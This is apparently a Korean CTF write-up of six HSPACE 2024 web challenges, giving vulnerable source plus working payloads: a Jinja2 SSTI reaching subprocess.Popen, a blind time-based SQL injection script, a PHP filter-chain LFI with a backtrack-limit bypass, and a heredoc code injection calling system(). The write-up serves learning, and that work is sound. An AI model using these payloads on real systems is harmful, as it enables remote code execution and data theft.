# 출처
https://velog.io/@bintable/HSPACE-2024-Space-war-WEB-write-up
일단 좋아 보여서 그대로 옮기긴 했는데 계속 추가 변경할 예정

---
# for-beginner

간단한 Jinja2 SSTI이다.

### code

```python
blacklist = ['os','subprocesses','exec','vars','sys','"','\+','open','rm','main','static','templates','ctf','rf','spawnlp','execfile','dir','dev','tcp','sh','import','built','__class__','for','request','\,','app','file','url_for','\[','\]','config']

def Prevent_SSTI(input):
    for i in blacklist:
        res = re.search(i,input)
        if res:
            return True
    else:
        return False

@app.route('/')
def main():
    name = request.args.get("name", "World")
    return render_template_string(f'Hello {name}!!')
```

SSTI 필터가 Blacklist로 존재하나, 따로 입력에 적용되어 있진 않았다.

### Exploit

```python
http://wargame/?name={{"".__class__.__mro__[1].__subclasses__()[494]('cat%20flag.txt',shell=True,stdout=-1).communicate()}}
```

subprocess.Popen이 494번째에 있어서 그걸로 RCE했다.

`hspace{57a32c35915278d4de4ca21a8dc22b7f642a2a33e1508050c9498e1e48290e38}`

---

# for_beginner-SQL

Time Based SQL Injection

### Code

```php
<?php
session_start();
require_once "config/dbconn.php";

$userid = $_GET['userid'];
$password = $_GET['password'];

if(isset($userid) && isset($password)) {
    $query = "SELECT userid, password FROM user WHERE userid = '${userid}' and password = '".md5($password)."'";
    try {
        $result = $mysqli->query($query);
        $data = mysqli_fetch_array($result);
        if(isset($data) && $data[0] == "admin" && $data[1] === md5($password)){
            die($flag);
	    } else {
		    die("Wrong...");
	    }
    } catch(Exception $e) {
    }
} else {
    show_source(__FILE__);
}
?>
```

따로 password가 틀리지 않는 이상 반응이 없어서 Time Based로 풀었다.

### Exploit

```python
import requests
import time


for i in range(1, 40):
    for j in range(43, 123):
        url = 'http://3.34.190.217:2023'
        payload = url + '/?userid=admin%27and%20if(ascii(substr(password,'+str(i)+',1))="'+str(j)+'",sleep(1),1)--%20-&password=1'

        start = time.time()

        res = requests.get(payload)

        end = time.time()

        if end - start > 1:
            print("index : "+str(i)+"--->"+chr(j))
```

코드를 돌려 보면 32자리의 password를 확인할 수 있다.

`ede6b5037b5826fe48fc1f0f3772c48f` 이 문자열 그대로 password에 넣어도 틀렸다고 보인다.

![](https://velog.velcdn.com/images/bintable/post/6617ee14-d228-41f7-8661-595613c07a55/image.png)32자리니까 MD5 Hash가 아닐까 싶어 rainbow table에 넣어서 돌려보니 `1q2w3e4r5t6y`라는 값을 확인할 수 있다.

해당 값을 password로 넣어 해결했다.

`hspace{12cb8da4edbe2a3cba650182b86570772005aef5b3840fef41e46ad8}`


---
# Magic eye

간단한 Brute Force 문제

### Exploit

```python
import requests

input_string = "0123456789abcdefghijklmnopqrstuvwxyz{"
url = "http://wargame/h/"

def check_server_path(url):
    for char in input_string:
        next_url = url + char
        print(next_url)

        res = requests.get(next_url)

        print(res.text)

        if res.status_code == 200:
            next_url += '/'
            print(next_url)
            check_server_path(next_url)

check_server_path(url)
```

코드가 좀 이상하긴 하지만

```plaintext
http://wargame/h/s/p/a/c/e/%7B/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/6
```

에서 Flag 값의 나머지 반을 확인할 수 있다.

`hspace{5afcf1de45c12f58dd0cfb2cfdfa22e6_cab2038942053898e0e6486cebfd368a}`


---
# Web101
### Exploit

```null
index.html 주석에서 1번째 flag 획득 : hspace{D0
/.git/에서 2번째 flag 획득 : n7_uuuuuu
/.index.html.swp에서 3번째 flag 획득 : uuse_D1
/flag.txt에서 4번째 flag 획득 : rBu573r_i
/admin/index.html에서 5번째 flag 획득 : n_R34lCTF_PL
/robots.txt에서 6번째 flag 획득 : LLLLlllzzzz}
```

합쳐서 해결 `hspace{D0n7_uuuuuuuuse_D1rBu573r_in_R34lCTF_PLLLLLlllzzzz}`


---

# Multiline PHP challenge

PHP Filter Chain 문제

### Code

#### index.php

```php
<?php

include "config.php";

$page = $_REQUEST["p"];
if (!$page) {
    $page = "hello";
}

if($page[0] === '/' || preg_match("/^.*(\\.\\.|:\\/\\/|php).*$/i", $page)) {
    die("no hack");
}

include "$page.php";
```

include를 보고 LFI 공격임을 알았고, 필터링이 있다는 것을 확인했다.

### Exploit

> [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

위 filter chain 생성기로 RCE 코드를 생성했다.

```null
$ python3 php_filter_chain_generator.py --chain '<?php system("cat config.php"); ?>'
[+] The following gadget chain will generate the following code : <?php system("cat config.php"); ?> (base64 value: PD9waHAgc3lzdGVtKCJjYXQgY29uZmlnLnBocCIpOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

filter chain만으로는 RCE가 불가능하고

```php
if($page[0] === '/' || preg_match("/^.*(\\.\\.|:\\/\\/|php).*$/i", $page)) {
    die("no hack");
}
```

위와 같은 필터링을 우회해야 한다. preg_match php bypass라는 키워드로 계속해서 우회법을 찾다 보니, 다음과 같은 중국분의 글을 확인할 수 있었다.

> [https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

해당 글을 통해 서버에 설정된 `pcre.backtrack_limit` 값을 넘어서게 되면, preg_match의 결과가 false로 설정되어 우회할 수 있는 것을 알았고,

![](https://velog.velcdn.com/images/bintable/post/907e6f08-1a63-4296-8f32-580ea2e34d38/image.png)`info` 페이지를 통해 서버에 설정된 `pcre.backtrack_limit` 값이 1000임을 알 수 있다.

```php
http://3.34.190.217:24913/index.php?p=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
```

다음과 같이 끝 쪽에 `+`를 추가하여 우회했고, `config.php`파일에 존재하는 flag값을 주석으로 확인할 수 있었다.

![](https://velog.velcdn.com/images/bintable/post/d53231da-effb-472b-9e23-6fd67b5b76b3/image.png)

`hspace{5525f4bd51f0c29ac4f7f762813af852}`

---

## Online Calculator

PHP Trick을 통한 Code Injection

### Code

```php
<?php
  $x = $_POST["x"];
  $y = $_POST["y"];
  $op = $_POST["op"];
  $message = $_POST["message"];
  $user_answer = $_POST["user_answer"];

  if(!$x || !$y || !$op || !$message || !$user_answer) {
    die("something wrong");
  }

  //validate values
  $x = (float)($x);
  $y = (float)($y);
  
  if(preg_match("/[^+\-*\/]/", $op)) {
    die("no hack");
  }
  
  $message = addslashes($message);
  $user_answer = (float)($user_answer);
  $code = "
<?php
\$real_answer = $x $op $y;
if (\$real_answer == $user_answer) {
  echo '<script>alert(`$message`); location.href=`../index.php`;</script>';
} else {
  echo '<script>alert(`wrong`); location.href=`../index.php`;</script>';
}
  ";

  $fn = "calc/".sha1(random_bytes(16)).".php";
  file_put_contents($fn, $code);

  header("Location: $fn");
?>
```

코드를 보면 POST로 총 5가지의 파라미터 값을 받고 있다. 이 때 결과를 출력하는 php 코드를 `code`변수에 저장하고, `calc/.sha1(random_bytes(16)).php` 파일을 하나 생성해서 작성한 php 코드를 파일에 기입한다.

### Exploit

```php
$x = (float)($x);
$y = (float)($y);
  
if(preg_match("/[^+\-*\/]/", $op)) {
   die("no hack");
}
  
$message = addslashes($message);
$user_answer = (float)($user_answer);
```

`x`, `y`, `user_answer`은 float 처리를 하고 있고, `message`는 addslashes 처리를 `op`는 preg_match 정규표현식으로 필터링을 하고 있다.

```php
$code = "
<?php
\$real_answer = $x $op $y;
if (\$real_answer == $user_answer) {
  echo '<script>alert(`$message`); location.href=`../index.php`;</script>';
} else {
  echo '<script>alert(`wrong`); location.href=`../index.php`;</script>';
}
";

$fn = "calc/".sha1(random_bytes(16)).".php";
file_put_contents($fn, $code);
```

code 변수에 받은 파라미터들로 코드를 작성하고, 이후 파일을 생성하여 기입하고 있어, 파라미터를 통해 code 변수에 system 함수를 넣어 파일에 작성하면 php 코드로 읽혀 실행되어 Code Injection이 가능해 보인다.

```php
##입력 값##
$op=/*&$message=*/; system(<<<EOF
ls
EOF); ?>

##결과 값##
<?php
\$real_answer = $x /* $y;
if (\$real_answer == $user_answer) {
  echo '<script>alert(`*/; system(<<<EOF
ls
EOF); ?>`); location.href=`../index.php`;</script>';
} else {
  echo '<script>alert(`wrong`); location.href=`../index.php`;</script>';
}
```

다음과 같이 입력하면, `$op`변수가 따로 `'`나 `"`로 묶여 있지 않아, 주석으로 동작하고, 이후 system 함수가 PHP 코드로 인식되어 파일에 작성되어 RCE가 가능하다.

```php
user_answer=123&x=39555&y=71674&op=/*&message=*/; system(<<<EOF
cd ..; ls; cat flag_aac8a209846d5e58cb2837d10d81156e.php;
EOF); ?>
```

로 해결

![](https://velog.velcdn.com/images/bintable/post/b4ce83d7-1826-4820-92d4-f206bd3f2d45/image.png)

`hspace{9cbc79956e1e9ebeb727f43babf3b588}`